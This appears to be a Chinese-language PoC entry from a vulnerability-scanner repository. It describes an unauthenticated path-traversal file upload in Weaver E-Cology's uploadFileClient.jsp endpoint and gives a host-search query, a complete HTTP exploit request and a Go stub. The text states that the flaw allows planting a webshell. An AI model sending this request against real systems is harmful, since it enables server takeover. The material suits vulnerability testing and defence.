---
source: "TD0U/WeaverScan"
---

# 泛微E-Cology UploadFileClient 任意文件上传漏洞

## 漏洞描述

泛微 E-Cology 的 `/clusterupgrade/uploadFileClient.jsp` 接口存在任意文件上传漏洞。该接口未做登录校验，`FileName` 参数可控且存在路径遍历，攻击者无需登录即可上传任意文件到服务器，直接获取 Webshell。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```http
POST /clusterupgrade/uploadFileClient.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="FileName"
../../clusterupgrade/a7.txt
------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata"; filename="a7.txt"
Content-Type: text/plain

webshell content
------WebKitFormBoundary--
```

`FileName` 参数使用 `../../` 遍历到可访问的 Web 目录，上传成功后直接访问对应路径即可执行上传的文件。将文件内容替换为 JSP Webshell 即可获取服务器控制权限。

参考 PoC（Go，来源 TD0U/WeaverScan）：

```go
func UploadFileClient(target string) {
    url := target + "/clusterupgrade/uploadFileClient.jsp"
    // POST multipart，FileName 参数为 "../../clusterupgrade/a7.txt"
}
```
